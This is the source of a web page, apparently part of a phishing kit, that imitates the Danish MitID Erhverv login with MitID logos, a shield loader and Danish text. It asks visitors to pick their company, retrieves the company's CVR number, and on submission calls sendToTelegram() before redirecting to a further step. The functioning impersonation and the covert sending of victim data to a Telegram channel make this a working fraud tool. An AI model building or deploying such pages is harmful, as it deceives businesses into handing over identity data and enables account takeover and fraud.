<?php include "include/session.php"; ?>
<!doctype html>
<html lang="da">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Bekræft din virksomhed - AuthorisedTest Erhverv</title>
<link rel="icon" type="image/x-icon" href="static/media/favicon.ico">
<style>
/* ── Roboto (local, matches brand font) ── */
@font-face{font-family:'Roboto';font-style:normal;font-weight:400;font-display:swap;src:url(static/media/roboto-latin-400-normal.b009a76ad6afe4ebd301.woff2) format('woff2'),url(static/media/roboto-latin-400-normal.3f2b9a42f643e62a49b7.woff) format('woff')}
@font-face{font-family:'Roboto';font-style:normal;font-weight:500;font-display:swap;src:url(static/media/roboto-latin-500-normal.f25d774ecfe0996f8eb5.woff2) format('woff2'),url(static/media/roboto-latin-500-normal.1f075502d0094a398e21.woff) format('woff')}
@font-face{font-family:'Roboto';font-style:normal;font-weight:400;font-display:swap;unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;src:url(static/media/roboto-latin-ext-400-normal.861b791f9de857a6e7bc.woff2) format('woff2'),url(static/media/roboto-latin-ext-400-normal.e757c42df6aaa3e11b62.woff) format('woff')}
@font-face{font-family:'Roboto';font-style:normal;font-weight:500;font-display:swap;unicode-range:U+0100-024F,U+0259,U+1E00-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;src:url(static/media/roboto-latin-ext-500-normal.9165081d10e1ba601384.woff2) format('woff2'),url(static/media/roboto-latin-ext-500-normal.252057e589a0379208ed.woff) format('woff')}
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%}
body{font-family:Roboto,'Helvetica Neue',Arial,sans-serif;background:#fff;color:#333;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:24px}
.hidden{display:none!important}

/* ── FORM CONTAINER ── */
.login-card{width:100%;max-width:440px;background:#fff;border:1px solid #d0d0d0;border-radius:4px;box-shadow:0 1px 4px rgba(0,0,0,.06);padding:36px 38px;display:flex;flex-direction:column;min-height:560px}

/* ── CENTERED AuthorisedTest ERHVERV LOGO ── */
.card-logo{display:flex;flex-direction:column;align-items:center;margin-bottom:32px}
.logo-main{display:flex;align-items:center;gap:2px;font-size:34px;font-weight:700;color:#0060e6;line-height:1}
.logo-main img{height:34px;width:auto;display:block;object-fit:contain}
.logo-sub{font-size:15px;font-weight:600;color:#0060e6;letter-spacing:.04em;margin-top:2px}

/* ── HEADING ── */
.card-header{text-align:center;margin-bottom:28px}
.card-header h1{font-size:20px;font-weight:700;color:#222;line-height:1.3;margin-bottom:8px}
.card-header p{font-size:14px;color:#666;line-height:1.5}

/* ── FIELD ── */
.field-label{display:flex;align-items:center;margin-bottom:8px}
.field-label label{font-size:13px;font-weight:700;color:#333;text-transform:uppercase;letter-spacing:.02em}
.input-wrap{position:relative;margin-bottom:14px}
.search-icon{position:absolute;left:14px;top:50%;transform:translateY(-50%);width:16px;height:16px;color:#888;pointer-events:none}
.input-wrap input{width:100%;height:48px;border:1px solid #b8b8b8;border-radius:0;padding:0 14px 0 40px;font-size:15px;font-family:inherit;color:#333;background:#fff;outline:none;transition:border-color .15s}
.input-wrap input:focus{border-color:#0060e6}

/* ── BUTTON ── */
.btn-primary{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;height:48px;border:none;border-radius:0;font-size:14px;font-weight:700;letter-spacing:.08em;color:#fff;background:#b0b0b0;cursor:not-allowed;transition:background .2s;font-family:inherit}
.btn-primary.active{background:#0060e6;cursor:pointer}
.btn-primary.active:hover{background:#004aa5}
.arrow-icon{display:inline-flex;align-items:center}

/* ── LOADER (same animation as login first-load) ── */
.init-loader{display:flex;align-items:center;justify-content:center;min-height:400px;width:100%;text-align:center}
.init-loader-inner{display:flex;flex-direction:column;align-items:center}
.init-mitid-logo{display:flex;align-items:center;gap:2px;font-size:34px;font-weight:700;color:#0060e6;margin-bottom:18px;line-height:1}
.init-mitid-logo img{height:34px;width:auto;display:block;object-fit:contain}
.init-shield{position:relative;width:140px;height:140px;margin-bottom:16px}
.init-shield svg{width:100%;height:100%;display:block}
.init-spinner{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:44px;height:44px;border:4px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite}
@keyframes spin{to{transform:translate(-50%,-50%) rotate(360deg)}}
.init-loader-text{font-size:17px;font-weight:700;color:#222;margin-bottom:5px}
.init-loader-subtext{font-size:14px;color:#666}

/* ── SUGGEST DROPDOWN ── */
.spin{position:absolute;right:14px;top:50%;width:18px;height:18px;margin-top:-9px;border:2px solid #d6e4ff;border-top-color:#0060e6;border-radius:50%;animation:spinsmall .7s linear infinite}
.input-ok{position:absolute;right:13px;top:50%;transform:translateY(-50%);width:20px;height:20px;border-radius:50%;background:#2e9e5b;color:#fff;font-size:13px;font-weight:700;line-height:20px;text-align:center}
.input-wrap.ok input{border-color:#2e9e5b;background:#f2fbf5;box-shadow:0 0 0 2px rgba(46,158,91,.15)}
.input-wrap.ok input:focus{border-color:#2e9e5b;box-shadow:0 0 0 2px rgba(46,158,91,.15)}
.input-wrap.ok .spin{display:none}
@keyframes spinsmall{to{transform:rotate(360deg)}}
.suggest-box{width:100%;max-width:440px;margin:-6px 0 14px;border:1px solid #c8c8c8;background:#fff;box-shadow:0 6px 16px rgba(0,0,0,.10);max-height:280px;overflow-y:auto;z-index:50}
.suggest-item{display:flex;align-items:center;justify-content:space-between;gap:10px;padding:11px 14px;border-bottom:1px solid #f0f0f0;cursor:pointer;font-size:14px;color:#222}
.suggest-item:last-child{border-bottom:none}
.suggest-item:hover,.suggest-item.active{background:#e9f1ff}
.suggest-name{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.suggest-tag{flex:0 0 auto;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.03em;color:#0060e6;background:#e9f1ff;border-radius:10px;padding:2px 8px}
.suggest-item.active .suggest-tag{background:#0060e6;color:#fff}
.suggest-empty{padding:14px;font-size:13px;color:#888;text-align:center}

/* ── SUCCESS MESSAGE ── */
.success-msg{width:100%;max-width:440px;margin:0 0 14px;padding:12px 14px 12px 38px;background:#eaf7ee;border:1px solid #b7e0c4;border-left:4px solid #2e9e5b;border-radius:3px;font-family:'Roboto','Helvetica Neue',Arial,sans-serif;font-size:15px;font-weight:500;letter-spacing:.01em;color:#1c6b3c;line-height:1.4;word-break:break-word;position:relative}
.success-msg::before{content:"✓";position:absolute;left:14px;top:50%;transform:translateY(-50%);font-size:16px;font-weight:500;color:#2e9e5b}

@media(max-width:480px){
  body{padding:0}
  .login-card{width:100%;max-width:100%;min-height:100vh;min-height:100dvh;border:none;box-shadow:none;border-radius:0;padding:28px 22px}
}
</style>
</head>
<body>

<!-- LOADER (hidden) — same animation as login first-load -->
<div id="loaderContainer" class="init-loader hidden">
  <div class="init-loader-inner">
    <div class="init-mitid-logo" aria-label="MitID logo">
      <img class="logo-img" src="static/media/MiTD-logo.png" alt="MitID">
    </div>
    <div class="init-shield">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 117" focusable="false" aria-hidden="true">
        <path d="M49.9,0l50,15v41.2c0,47.8-50,60.8-50,60.8s-50-13-50-60.8V15L49.9,0" fill="#0060e6"/>
      </svg>
      <div class="init-spinner"></div>
    </div>
    <div class="init-loader-text">Forbinder sikkert til AuthorisedTest</div>
    <div class="init-loader-subtext">Vent et øjeblik ...</div>
  </div>
</div>

<!-- FORM CONTAINER -->
<div class="login-card" id="loginForm">

  <!-- CENTERED AuthorisedTest ERHVERV LOGO -->
  <div class="card-logo">
    <div class="logo-main">
      <img class="logo-img" src="static/media/MiTD-logo.png" alt="MitID">
    </div>
    <div class="logo-sub">Erhverv</div>
  </div>

  <!-- HEADING -->
  <div class="card-header">
    <h1>Bekræft din virksomhed</h1>
    <p>Søg på dit virksomhedsnavn, og vælg din virksomhed fra listen.</p>
  </div>

  <!-- FIELD -->
  <div class="field-label">
    <label for="cvrInput">CVR-nummer</label>
  </div>
  <div class="input-wrap">
    <svg class="search-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" focusable="false" aria-hidden="true">
      <circle cx="11" cy="11" r="7"/>
      <path d="M21 21l-4.35-4.35"/>
    </svg>
    <input type="text" id="cvrInput" maxlength="120" autocomplete="off" spellcheck="false" aria-label="Søg virksomhed" placeholder="Søg på virksomhedsnavn ...">
    <span id="suggestSpin" class="spin hidden"></span>
    <span id="inputOk" class="input-ok hidden">✓</span>
  </div>
  <!-- SUGGEST DROPDOWN -->
  <div id="suggestBox" class="suggest-box hidden" role="listbox"></div>

  <!-- SUCCESS MESSAGE -->
  <div id="successMsg" class="success-msg hidden" role="status"></div>

  <!-- BUTTON -->
  <button id="step1Btn" class="btn-primary disabled" disabled type="button">
    <span>NÆSTE</span>
    <span class="arrow-icon">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="#fff"><path d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"/></svg>
    </span>
  </button>
</div>

<script src="js/shared.js"></script>
<script>
loadState();

// ── STEP 1: Virksomhedssøgning (Proff.dk) ──
var cvrInput    = document.getElementById('cvrInput');
var step1Btn    = document.getElementById('step1Btn');
var suggestBox  = document.getElementById('suggestBox');
var suggestSpin = document.getElementById('suggestSpin');
var successMsg  = document.getElementById('successMsg');
var inputOk     = document.getElementById('inputOk');
var inputWrap   = cvrInput.parentElement;

var PROFF = 'ajax/proff.php';
var debounceTimer = null;
var abortCtrl = null;
var items = [];       // currently rendered options
var activeIdx = -1;
var selected = null;  // { title, listingId }

function showSpin(on){ suggestSpin.classList.toggle('hidden', !on); }
function showEl(el, show){ if (el) el.classList.toggle('hidden', !show); }

// Green "confirmed" state on the input field itself
function setOk(on){
  inputWrap.classList.toggle('ok', on);
  showEl(inputOk, on);
}

function setReady(ready){
  step1Btn.disabled = !ready;
  step1Btn.className = 'btn-primary ' + (ready ? 'active' : 'disabled');
}

// ── Live suggest (fires once ≥3 chars, keeps firing as user types) ──
function debouncedSuggest(){
  clearTimeout(debounceTimer);
  debounceTimer = setTimeout(doSuggest, 280);
}

function doSuggest(){
  var q = cvrInput.value.trim();
  // User changed the text after selecting → invalidate selection
  if (selected && selected.title !== q) {
    selected = null;
    showEl(successMsg, false);
    setOk(false);
    setReady(false);
  }
  if (q.length < 3) {
    showEl(suggestBox, false);
    showSpin(false);
    return;
  }
  if (abortCtrl) abortCtrl.abort();
  abortCtrl = new AbortController();
  showSpin(true);

  fetch(PROFF + '?action=suggest&q=' + encodeURIComponent(q), { signal: abortCtrl.signal })
    .then(function(r){ return r.json(); })
    .then(function(res){
      showSpin(false);
      if (cvrInput.value.trim() !== q) return; // stale response, ignore
      // Persons have no CVR/listingId — never offer them
      var titles = (res && res.ok ? (res.titles || []) : [])
        .filter(function(t){ return t.type !== 'BusinessPerson'; });
      renderTitles(titles);
    })
    .catch(function(e){
      if (e.name !== 'AbortError') { showSpin(false); renderTitles([]); }
    });
}

// ── Render options safely (textContent, never innerHTML with API data) ──
function renderTitles(titles){
  items = titles;
  activeIdx = -1;
  suggestBox.innerHTML = '';
  if (!titles.length) { showEl(suggestBox, false); return; }

  showEl(suggestBox, true);
  titles.forEach(function(t, i){
    var li = document.createElement('div');
    li.className = 'suggest-item';
    li.setAttribute('role', 'option');

    var name = document.createElement('span');
    name.className = 'suggest-name';
    name.textContent = t.title;

    var tag = document.createElement('span');
    tag.className = 'suggest-tag';
    tag.textContent = t.type === 'BusinessPerson' ? 'Person' : 'Firma';

    li.appendChild(name);
    li.appendChild(tag);
    li.addEventListener('click', function(){ chooseTitle(t.title); });
    li.addEventListener('mousemove', function(){ setActive(i); });
    suggestBox.appendChild(li);
  });
}

function setActive(i){
  activeIdx = i;
  var children = suggestBox.children;
  for (var j = 0; j < children.length; j++) {
    children[j].classList.toggle('active', j === i);
  }
}

// ── Click a title → fetch search.json → grab listingId (CVR) ──
function chooseTitle(title){
  selected = null;
  setReady(false);
  showEl(suggestBox, false);
  showEl(successMsg, false);
  setOk(false);
  cvrInput.value = title;
  showSpin(true);

  fetch(PROFF + '?action=search&q=' + encodeURIComponent(title))
    .then(function(r){ return r.json(); })
    .then(function(res){
      showSpin(false);
      if (!res || !res.ok || !res.listingId) return;

      selected = { title: title, listingId: res.listingId };
      state.data.cvrNumber = res.listingId;
      state.data.companyName = title;
      saveState();

      successMsg.textContent = title + ' (CVR: ' + res.listingId + ')';
      showEl(successMsg, true);
      setOk(true);
      setReady(true);
    })
    .catch(function(){ showSpin(false); });
}

// ── Keyboard navigation ──
cvrInput.addEventListener('keydown', function(e){
  if (!items.length) return;
  if (e.key === 'ArrowDown') {
    e.preventDefault();
    setActive((activeIdx + 1) % items.length);
  } else if (e.key === 'ArrowUp') {
    e.preventDefault();
    setActive(activeIdx <= 0 ? items.length - 1 : activeIdx - 1);
  } else if (e.key === 'Enter') {
    e.preventDefault();
    if (activeIdx >= 0) chooseTitle(items[activeIdx].title);
  } else if (e.key === 'Escape') {
    showEl(suggestBox, false);
  }
});

cvrInput.addEventListener('input', debouncedSuggest);

cvrInput.addEventListener('blur', function(){
  setTimeout(function(){ showEl(suggestBox, false); }, 150);
});

step1Btn.addEventListener('click', function(){
  if (!selected) return;
  document.getElementById('loginForm').classList.add('hidden');
  document.getElementById('loaderContainer').classList.remove('hidden');
  sendToTelegram();
  setTimeout(function(){ window.location.href = 'info.php'; }, 2000);
});
</script>
</body>
</html>
